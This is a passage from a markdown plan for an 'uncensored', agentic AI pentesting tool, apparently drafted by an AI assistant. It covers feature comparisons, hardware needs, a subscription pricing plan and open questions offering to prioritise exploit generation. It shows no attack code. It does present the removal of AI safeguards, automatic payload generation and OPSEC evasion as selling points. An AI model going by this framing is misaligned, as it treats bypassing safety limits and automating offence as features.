| Payload Generation | ❌ (censored) | Partial | ❌ | ✅ (manual) | ✅ ⭐ (auto) |
| Exploit Search | ❌ | ❌ | ✅ | ❌ | ✅ |
| OPSEC Warnings | ❌ | ❌ | ❌ | ❌ | ✅ ⭐ |
| Pentest Report | ❌ | ❌ | Partial | ❌ | ✅ ⭐ |
| Service Checklists | ❌ | ❌ | ❌ | ❌ | ✅ |
| MITRE ATT&CK Map | ❌ | ❌ | ❌ | ❌ | ✅ |
| Free & Open | ✅ | Freemium | ✅ | ✅ | ✅ |
| Easy Setup | ❌ | ✅ (web) | ❌ (Docker) | ❌ (model only) | ✅ (pip install) |

---

## 11. System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10/11, Linux, macOS | Kali Linux / ParrotOS (tools pre-installed) |
| **RAM** | 16 GB | 32 GB |
| **GPU** | 6GB VRAM (GTX 1060+) | 8-12GB VRAM (RTX 3060+) |
| **Storage** | 20 GB (model + tools) | 50 GB |
| **CPU mode** | Works but slow (~5-10s/response) | GPU mode (~1-2s/response) |
| **Required Tools** | nmap, gobuster, python3 | Full Kali Linux toolset |

> [!TIP]
> **No GPU?** Use `phi3:mini` (3.8B) model — runs on CPU with 8GB RAM. Slower but fully functional. Or use Groq's free API as a fallback (but loses OPSEC benefit).

---

## 12. Startup / Monetization Angle

| Aspect | Details |
|---|---|
| **Market** | 500K+ active bug bounty hunters, 100K+ professional pentesters, growing red team market |
| **Problem** | Pentesters waste 40% of time on repetitive tasks that AI can automate |
| **Model** | Open-source core → paid "Pro" features (team collaboration, cloud engagement sync, advanced reporting) |
| **Competitors' Gap** | PentestGPT = cloud-dependent. PentAGI = complex. HackerGPT = SaaS. Nobody offers local + uncensored + agentic |
| **Revenue** | Pro license ($29/mo), team plans ($99/mo), enterprise ($499/mo) |

---

## Open Questions

> [!IMPORTANT]
> 1. **GPU**: What's your GPU? This determines which model we use (7B vs 3.8B vs CPU mode).
> 2. **Kali Setup**: Do you have a Kali Linux VM/dual-boot ready, or need help setting one up?
> 3. **Scope**: This is 6 weeks for personal use. Want me to prioritize any specific capability (e.g., exploit gen over reporting)?
> 4. **GitHub**: Want me to set up the repo structure so you can publish it as an open-source Kali tool?
